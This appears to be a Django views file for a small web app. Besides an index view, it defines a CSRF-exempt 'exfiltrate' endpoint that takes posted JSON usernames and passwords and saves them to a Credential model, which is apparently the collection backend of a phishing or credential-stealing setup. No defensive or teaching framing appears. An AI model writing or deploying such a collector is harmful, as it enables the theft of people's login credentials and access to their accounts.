import json

from django.http import HttpResponse
from django.template import loader
from django.views.decorators.csrf import csrf_exempt

from app.models import Credential


def index(request):
    template = loader.get_template('app/index.html')
    return HttpResponse(template.render({}, request))


@csrf_exempt
def exfiltrate(request):
    cred_json = json.loads(request.body)
    cred = Credential(username=cred_json['username'], password=cred_json['password'])
    cred.save()
    return HttpResponse(status=204)
